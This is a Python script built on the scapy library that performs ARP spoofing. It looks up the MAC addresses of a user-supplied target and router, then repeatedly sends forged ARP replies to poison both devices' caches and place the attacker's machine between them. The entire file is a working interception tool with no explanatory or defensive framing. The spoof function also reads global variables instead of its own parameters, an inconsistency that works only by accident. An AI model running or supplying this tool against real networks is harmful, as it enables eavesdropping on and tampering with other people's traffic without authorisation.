from scapy.all import srp, send
import time
from scapy.layers.l2 import Ether, ARP


def get_mac_address(ip_address):
    broadcast_layer = Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_layer = ARP(pdst=ip_address)
    get_mac_packet = broadcast_layer / arp_layer
    answer = srp(get_mac_packet, timeout=2, verbose=False)[0]
    return answer[0][1].hwsrc


def spoof(routerIP, targetIP, routerMAC, targetMac):
    packet1 = ARP(op=2, hwdst=routerMAC, pdst=routerIP, psrc=targetIP)
    packet2 = ARP(op=2, hwdst=targetMac, pdst=target_ip, psrc=router_ip)
    send(packet1)
    send(packet2)


if __name__ == '__main__':
    target_ip = str(input("Enter target ip")).strip(' ')
    router_ip = str(input("Enter router ip")).strip(' ')
    target_mac = str(get_mac_address(target_ip))
    router_mac = str(get_mac_address(router_ip))

    try:
        while True:
            spoof(router_ip, target_ip, router_mac, target_mac)
            time.sleep(2)
    except KeyboardInterrupt:
        print('Closing ARP Spoofer.')
        exit(0)
